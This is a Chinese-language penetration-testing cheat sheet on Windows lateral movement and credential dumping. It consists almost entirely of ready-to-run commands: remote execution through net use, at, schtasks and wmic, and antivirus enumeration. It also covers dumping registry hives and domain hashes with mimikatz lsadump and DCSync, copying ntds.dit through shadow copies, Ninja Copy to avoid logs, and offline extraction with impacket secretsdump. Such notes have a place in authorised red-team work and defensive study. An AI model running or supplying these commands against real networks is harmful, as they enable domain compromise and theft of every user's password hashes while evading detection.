控制机器


net use

端口：445\主要功能是与目标机器建立 ipc 链接，查看共享文件

net use \\10.10.10.1 /user:admin "password"
dir \\10.10.10.1\c$


at

端口 : 445\主要功能是通过 netuse 建立的通道，对目标机器进行计划任务的下发，定时自动执行，无法手动执行

at \\10.10.10.1 11:50AM "cmd /c whoami > c:\windows\temp\res.txt"



schtasks

端口：139\at 在比较新的系统中，已经被淘汰了，慢慢转向了 schtasks。

schtasks /s 10.10.10.1 /u admin /p admin /query
schtasks /create /tn name /st 16:20 /sc once /tr "cmd /c whoami > c:\windows\temp\res.txt" 
schtasks /run /tn name
schtasks /delete /tn name /f
--
/ru /rp 可以用指定的身份执行命令，留空默认是system



wmic

端口：135\使用 wmi 协议在目标机器上执行操作，功能强大，可以查看安装的操作系统基础信息，软件，进程列表，杀软列表，也能执行命令等等，常用命令

wmic /node:10.10.10.1 /user:admin /password:admin os
wmic process get caption,commandline,processid
wmic products get installdate,version
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe



reg

主要用来保存注册表有关内容,可以远程保存,前提需要 net use 建立连接。

reg save \\10.10.10.1\HKLM hklm.hiv



wevtutil

windows 日志查询器,可以查询各种 windows 日志，支持远程查询，使用的是 xpath 语法，可以自定义筛选。

wevtutil qe Security /q:"\*\[System\[Provider\[@Name='Microsoft-Windows-Security-Auditing'\] and (EventID=4624)\] and EventData\[(Data\[@Name='LogonType'\]='10')\]\]"

/r:10.10.10.1 /u:admin /p:password

脱取文件 本地分析


reg save

拥有了主机控制账号密码，可以在远程导出目标机器注册表内容，然后本地分析，得到密码\


reg save \\10.10.10.1\HKLM\SYSTEM system.save
reg save \\10.10.10.1\HKLM\SAM sam.save
reg save \\10.10.10.1\HKLM\SECURITY security.save
lsadump::sam /sam:sam.save /system:system.save
lsadump::secrets /sam:sam.save /system:system.save /security:security.save

ntds


lsadump::dcsyc

在内网中，有域管账号密码，就可以使用 dcsync 远程同步域所有域用户的 hash，不过会产生日志。一般在域控上装有很强的 edr 时才测试使用。

lsadump::dcsync /domain:shuidi.com /all /csv


离线分析之脱取文件

本地分析，需要的文件有 ntds.dit sam system 三个

vssadmin

卷影复制

vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\ntds\ntds.dit c:\windows\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\windows\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam c:\windows\temp\
vssadmin delete shadows /for=c: /quiet


ninja copy

使用网上的 ninja copy 脚本，对 ntds samsystem 进行强行复制，拖取即可，不会产生日志\代码链接

离线分析

修复 ntds, 最好是在本机修复，否则容易失败，修复成功的信息更加全面

esentutl /p /o ntds.dit


目前来说，最好用的就是 impacket 组件中的 secretdump。

impacket-secretdump -sam SAM -system SYSTEM -ntds ntds.dit -user-status -pwd-last-set -history local
